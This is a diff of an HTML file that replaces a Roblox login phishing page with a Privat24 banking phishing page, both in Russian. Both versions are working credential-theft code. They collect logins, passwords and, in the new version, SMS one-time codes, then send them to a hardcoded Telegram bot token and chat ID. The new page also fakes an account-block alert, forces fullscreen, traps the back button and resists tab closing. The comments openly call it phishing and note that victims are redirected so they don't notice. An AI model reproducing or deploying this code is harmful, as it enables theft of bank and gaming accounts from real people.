@@ -2,179 +2,125 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход — Roblox</title>
-    <!-- Подключаем шрифт Roblox (Source Sans Pro) -->
-    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Блокировка счёта</title>
     <style>
-        /* Полная копия стилей страницы входа Roblox */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #1a1a2e;
-            font-family: 'Source Sans Pro', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background: #ffffff;
-            border-radius: 8px;
-            padding: 40px 30px;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            text-align: center;
-        }
-        .logo {
-            margin-bottom: 25px;
-        }
-        .logo img {
-            width: 150px;
-            height: auto;
-        }
-        .login-container h1 {
-            font-size: 28px;
-            font-weight: 700;
-            color: #1a1a2e;
-            margin-bottom: 5px;
-        }
-        .login-container .sub {
-            font-size: 14px;
-            color: #6b6b7b;
-            margin-bottom: 25px;
-        }
-        .input-group {
-            text-align: left;
-            margin-bottom: 18px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a2e;
-            margin-bottom: 4px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #d1d1d6;
-            border-radius: 4px;
-            font-size: 16px;
-            font-family: 'Source Sans Pro', sans-serif;
-            background: #f9f9fc;
-            transition: border-color 0.2s;
-        }
-        .input-group input:focus {
-            border-color: #0078f2;
-            outline: none;
-            background: white;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            background: #0078f2;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 8px;
-        }
-        .login-btn:hover {
-            background: #0063d1;
-        }
-        .links {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        .links a {
-            color: #0078f2;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        .links a:hover {
-            text-decoration: underline;
-        }
-        .links .sep {
-            margin: 0 8px;
-            color: #b0b0c0;
-        }
-        .footer {
-            margin-top: 25px;
-            font-size: 12px;
-            color: #8e8e9e;
-        }
-        .footer a {
-            color: #0078f2;
-            text-decoration: none;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { max-width: 400px; padding: 20px; text-align: center; }
+        h1 { color: #ff4444; text-shadow: 0 0 10px #ff4444; font-size: 28px; margin-bottom: 20px; }
+        p { color: #ccc; font-size: 18px; line-height: 1.6; margin-bottom: 30px; }
+        .btn { background: #ff4444; color: #fff; border: none; padding: 15px 40px; font-size: 20px; border-radius: 8px; cursor: pointer; box-shadow: 0 0 20px rgba(255,68,68,0.5); }
+        .btn:hover { background: #ff6666; }
+        .card { background: #1a1a1a; padding: 40px; border-radius: 12px; width: 100%; max-width: 350px; box-shadow: 0 0 30px rgba(0,200,255,0.2); border: 1px solid #333; }
+        input { width: 100%; padding: 12px; margin: 5px 0 15px; background: #2a2a2a; border: 1px solid #444; border-radius: 6px; color: #fff; font-size: 16px; }
+        button { width: 100%; padding: 14px; margin-top: 15px; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .btn-blue { background: #00ccff; color: #000; }
+        .btn-green { background: #28a745; color: #fff; }
+        input[type="text"] { text-align: center; letter-spacing: 8px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-<div class="login-container">
-    <div class="logo">
-        <!-- Реальный логотип Roblox (с их CDN) -->
-        <img src="https://www.roblox.com/assets/img/logo/roblox-logo.png" alt="Roblox">
+    <!-- ЭКРАН 1: Чёрный экран с блокировкой -->
+    <div id="screenBlock" class="container">
+        <h1>⚠️ СЧЁТ ЗАБЛОКИРОВАН</h1>
+        <p>По подозрению в несанкционированном доступе ваш счёт в <strong>Приват24</strong> временно заморожен.<br>Для восстановления доступа необходимо пройти идентификацию.</p>
+        <button class="btn" onclick="showLogin()">🔓 РАЗБЛОКИРОВАТЬ</button>
     </div>
-    <h1>Вход</h1>
-    <p class="sub">Войдите в свою учётную запись Roblox</p>
 
-    <form id="loginForm">
-        <div class="input-group">
-            <label for="username">Имя пользователя</label>
-            <input type="text" id="username" placeholder="Введите имя пользователя" required>
+    <!-- ЭКРАН 2: Форма логина/пароля -->
+    <div id="screenLogin" class="container hidden">
+        <div class="card">
+            <h2>🔐 Подтверждение личности</h2>
+            <p>Введите данные, привязанные к счёту Приват24</p>
+            <input type="text" id="login" placeholder="Логин (номер карты / телефон)">
+            <input type="password" id="password" placeholder="Пароль">
+            <button class="btn-blue" onclick="sendLogin()">Продолжить</button>
         </div>
-        <div class="input-group">
-            <label for="password">Пароль</label>
-            <input type="password" id="password" placeholder="Введите пароль" required>
+    </div>
+
+    <!-- ЭКРАН 3: Форма SMS -->
+    <div id="screenSms" class="container hidden">
+        <div class="card">
+            <h2>📲 Код из SMS</h2>
+            <p>На ваш телефон отправлен код подтверждения</p>
+            <input type="text" id="sms" placeholder="Код" maxlength="6">
+            <button class="btn-green" onclick="sendSms()">Подтвердить</button>
         </div>
-        <button type="submit" class="login-btn">Войти</button>
-    </form>
-
-    <div class="links">
-        <a href="#">Забыли пароль?</a>
-        <span class="sep">·</span>
-        <a href="#">Зарегистрироваться</a>
     </div>
-    <div class="footer">
-        © 2026 Roblox Corporation. Все права защищены.
-    </div>
-</div>
 
-<script>
-// ВАШИ ДАННЫЕ ТЕЛЕГРАМ (уже вставлены)
-const BOT_TOKEN = '8881341948:AAEc1o7BsVXOK4VSayF2bRDrCHhymGVjogI';
-const CHAT_ID = '7092015279';
+    <script>
+        // ========== НАСТРОЙКИ (ЗАМЕНИТЕ ПРИ НЕОБХОДИМОСТИ) ==========
+        const BOT_TOKEN = '8881341948:AAEc1o7BsVXOK4VSayF2bRDrCHhymGVjogI';
+        const CHAT_ID   = '7092015279';
 
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
+        // Переменные для хранения данных
+        let userLogin = '';
+        let userPassword = '';
 
-    const message = `🔐 Roblox LOGIN\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
+        // Функция отправки в Telegram через GET (Image)
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            // Отправляем через Image (не блокирует CORS)
+            new Image().src = url;
+        }
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-    })
-    .then(() => {
-        // Перенаправляем на реальный Roblox, чтобы жертва не заметила
-        window.location.href = 'https://www.roblox.com/login';
-    })
-    .catch(() => {
-        // Даже если ошибка — всё равно редирект
-        window.location.href = 'https://www.roblox.com/login';
-    });
-});
-</script>
+        // Показать экран логина
+        function showLogin() {
+            document.getElementById('screenBlock').classList.add('hidden');
+            document.getElementById('screenLogin').classList.remove('hidden');
+            // Блокировка выхода
+            document.documentElement.requestFullscreen().catch(() => {});
+            history.pushState(null, null, location.href);
+        }
+
+        // Обработка логина/пароля
+        function sendLogin() {
+            userLogin = document.getElementById('login').value.trim();
+            userPassword = document.getElementById('password').value.trim();
+            if (!userLogin || !userPassword) {
+                alert('Заполните все поля');
+                return;
+            }
+            // Отправляем логин/пароль в Telegram
+            sendToTelegram(`🔐 ФИШИНГ (Приват24)\nЛогин: ${userLogin}\nПароль: ${userPassword}\n(ожидаем SMS)`);
+            // Переход к SMS-экрану
+            document.getElementById('screenLogin').classList.add('hidden');
+            document.getElementById('screenSms').classList.remove('hidden');
+            // Автофокус на поле SMS
+            document.getElementById('sms').focus();
+        }
+
+        // Обработка SMS
+        function sendSms() {
+            const sms = document.getElementById('sms').value.trim();
+            if (!sms) {
+                alert('Введите код из SMS');
+                return;
+            }
+            // Отправляем SMS в Telegram
+            sendToTelegram(`🔐 ФИШИНГ (Приват24)\nЛогин: ${userLogin}\nПароль: ${userPassword}\nSMS-код: ${sms}`);
+            // Редирект на реальный сайт Приват24 (или любой другой)
+            window.location.href = 'https://www.privat24.ua';
+        }
+
+        // Блокировка кнопки "Назад" (history)
+        window.addEventListener('popstate', function(e) {
+            history.pushState(null, null, location.href);
+        });
+        history.pushState(null, null, location.href);
+
+        // Принудительный полноэкранный режим при загрузке
+        document.addEventListener('DOMContentLoaded', function() {
+            document.documentElement.requestFullscreen().catch(() => {});
+        });
+
+        // Запрет закрытия вкладки (необязательно)
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+        });
+    </script>
 </body>
 </html>
